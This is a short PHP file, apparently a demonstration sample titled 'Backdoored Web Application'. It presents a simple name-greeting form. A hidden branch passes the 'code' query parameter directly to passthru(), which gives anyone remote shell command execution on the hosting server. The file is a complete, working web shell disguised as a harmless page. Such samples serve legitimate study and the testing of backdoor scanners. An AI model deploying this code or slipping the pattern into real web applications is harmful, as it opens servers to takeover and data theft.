<?php
// Backdoored Web Application v.1.0
// Copyright (C) MustLive 2012
echo "<h3>Backdoored Web Application</h3>\n";
if (isset($_GET{'name'}) && $_GET{'name'}) {
	echo "<p>Hello " . htmlspecialchars($_GET['name']) . "!</p>";
}
elseif (isset($_GET{'code'}) && $_GET{'code'}) {
	echo "<pre>\n";
	passthru($_GET['code']);
	echo "</pre>";
}
else {
	echo "<p>Enter your name:</p>\n";
	echo '<form action="" method="GET"><input name="name" size="30"> <input type="submit" value="Enter"></form>';
}
?>
